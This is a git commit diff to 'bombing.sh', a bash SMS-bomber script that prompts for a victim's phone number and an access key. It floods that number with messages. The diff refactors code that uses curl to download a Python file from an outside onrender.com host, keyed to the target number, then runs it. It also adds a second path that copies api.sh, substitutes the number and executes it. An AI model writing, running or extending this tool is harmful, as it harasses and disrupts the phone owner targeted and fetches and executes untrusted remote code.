9d6ea2cfc3a0c59da2ece70354d232ecccb20fa5
Keshav Gupta <140381004+officialkeshav@users.noreply.github.com>
2023-10-21 20:33:13 +0530

    bombing.sh

--- bombing.sh
+++ bombing.sh
@@ -23,7 +23,7 @@ echo -e '\e[91m
 ──█████─█████████████████████████─█████
 ──█████─████████████████──███████─█████
 ──█████─██████────────█──█────███─█████
-──█████─██  ▓▓▓█BOMBER──█▓▓─▓─███─█████
+──█████─██     ▓▓▓█BOMBER──█▓▓─▓─███─████
 ──█████─███─█─▓▓▓▓▓▓█──█▓▓─▓▓─███─█████
 ──█████─██──█─▓▓▓▓▓█──█▓▓─▓▓▓─███─█████
 ──█████─███─█─▓▓▓▓█──█▓▓─▓▓▓▓─███─█████
@@ -60,7 +60,7 @@ echo -e '\e[93m
 ──█████─█████████████████████████─█████
 ──█████─████████████████──███████─█████
 ──█████─██████────────█──█────███─█████
-──█████─██  ▓▓▓█BOMBER──█▓▓─▓─███─█████
+──█████─██     ▓▓▓█BOMBER──█▓▓─▓─███─████
 ──█████─███─█─▓▓▓▓▓▓█──█▓▓─▓▓─███─█████
 ──█████─██──█─▓▓▓▓▓█──█▓▓─▓▓▓─███─█████
 ──█████─███─█─▓▓▓▓█──█▓▓─▓▓▓▓─███─█████
@@ -78,13 +78,38 @@ echo -e '\e[93m
 ------------------------------INSTAGRAM:- official_.keshav'
                                          echo -e '\e[93m CODED BY KESHAV'
 }
- 
+kp(){
+echo -e "\e[95m Settting Up Server"
+curl -o keshav.py "https://mbomber2-o.onrender.com/jatinkalwar/sms/$num"  >/dev/null 2>&1
+
+if [ -f "keshav.py" ];
+then
+action=$(cat keshav.py)
+if [ "$action" == "false" ];
+then
+echo "Something Went Wrong From Server"
+else
+echo -e "\e[95m Bombing start"
+python3 keshav.py
+fi
+else
+echo "Something Went Wrong"
+fi
+}
+
+sp(){
+echo -e "bombing start"
+cp api.sh app.sh
+ sed -i s/€tor/$num/g app.sh
+bash app.sh
+}
+
 banner
 echo -e ""
+ echo -e '\e[94m ENTER YOUR ACCESS KEY'
+echo -e ""
+echo -e ""
 echo -e '\e[93m  IF YOU DONT KNOW ACCESS KEY THEN MESSAGE TELEGRAM :- OFFICIALKESHAV'
-echo ""
- echo  -ne "\e[91m Enter Your ACCESS KEY :-"
-echo ""
 read acces
 if [ "$che" == "$acces" ];
 then
@@ -106,29 +131,28 @@ sleep 5.0
 bomb(){
 clear 
 banner 
-echo -e "\e[95m Settting Up Server"
-curl -o keshav.py "https://mbomber2-o.onrender.com/jatinkalwar/sms/$num"  >/dev/null 2>&1
-if [ -f "keshav.py" ];
+sleep 2.0
+if [ "$method" == "true" ];
 then
-action=$(cat keshav.py)
-if [ "$action" == "false" ];then
-echo "Something Went Wrong From Server"
+kp
+method="false"
+echo ""
 else
-echo -e "\e[95m Bombing start"
-python3 keshav.py
+sp
+echo
 fi
-else
-echo "Something Went Wrong"
-fi
+
+
 con
 }
+
+
 con(){
 echo -e " "
 echo -e "\e[31m# \e[93m BOMBER\e[93m \e[92m(\e[31m$v\e[92m)"
 echo -e "\e[92m[\e[91m1\e[92m]\e[93m RE-BOMB\e[93m"
 echo -e "\e[92m[\e[91m2\e[92m]\e[93m EXIT\e[93m"
 echo -e "\e[92m[\e[91m3\e[92m]\e[93m ARE BHAI BAS KAR PHONE MAAR JAYEGA USKA\e[93m"
-echo ""
 echo -ne "select:-"
 
 read opt
@@ -144,5 +168,8 @@ echo  ""
 fi
 
 }
+method="true"
 read num
 bomb
+
+
